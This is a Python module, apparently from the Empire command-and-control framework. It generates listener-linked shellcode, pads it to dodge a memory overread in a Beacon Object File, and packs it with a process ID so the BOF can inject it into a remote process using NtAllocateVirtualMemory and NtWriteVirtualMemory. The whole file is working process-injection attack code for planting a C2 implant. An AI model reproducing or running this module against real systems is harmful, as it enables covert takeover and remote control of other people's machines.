import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.bof_packer import Packer
from empire.server.utils.shellcode_compiler import generate_pic_shellcode


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        **kwargs,
    ):
        agent_language = kwargs.get("agent_language", "")
        listener_name = params["Listener"]
        language = params["Language"]
        pid = int(params["Pid"])

        shellcode = generate_pic_shellcode(main_menu, listener_name, language)

        # The BOF uses BeaconDataLength() for shellcode_size, which returns 4+N
        # (the 4-byte Packer length-prefix counts as part of the remaining buffer).
        # NtAllocateVirtualMemory receives &(shellcode_size+1) as an in/out RegionSize
        # and writes back the page-rounded allocation, so NtWriteVirtualMemory ends up
        # using page_size-1 bytes as the count — far more than N.  Padding to
        # (4096k - 5) bytes makes shellcode_size+1 exactly page-aligned, so
        # NtAllocateVirtualMemory writes back the same value and the overread shrinks
        # to 4 bytes, which stays within the same Go/CLR heap object.
        _target = ((len(shellcode) + 5 + 4095) // 4096) * 4096 - 5
        if len(shellcode) < _target:
            shellcode = shellcode + b"\x00" * (_target - len(shellcode))

        script_path = main_menu.modulesv2.module_source_path / module.bof.x64
        bof_data = script_path.read_bytes()
        b64_bof_data = base64.b64encode(bof_data).decode("utf-8")

        packer = Packer()
        packer.addint(pid)
        packer.addbytes(shellcode)

        return main_menu.modulesv2.format_bof_output(
            bof_data_b64=b64_bof_data,
            hex_data=packer.getbuffer_data(),
            agent_language=agent_language,
            obfuscate=obfuscate,
        )
